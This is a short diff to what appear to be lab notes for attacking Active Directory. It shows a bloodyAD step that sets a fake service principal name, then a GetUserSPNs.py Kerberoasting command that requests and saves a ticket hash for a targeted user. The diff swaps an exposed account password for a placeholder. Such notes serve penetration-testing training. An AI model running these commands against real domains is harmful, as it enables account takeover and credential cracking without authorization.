@@ -1490,7 +1490,7 @@ bloodyAD -u mssqladm -p 'pass' \
   -v 'fake/DEV01.INLANEFREIGHT.LOCAL'
 
 # Step 2 — Kerberoast the target user
-GetUserSPNs.py INLANEFREIGHT.LOCAL/mssqladm:'DBAilfreight1!' \
+GetUserSPNs.py INLANEFREIGHT.LOCAL/mssqladm:'password' \
   -dc-ip 172.16.8.3 \
   -request-user aduser \
   -outputfile aduser.hash
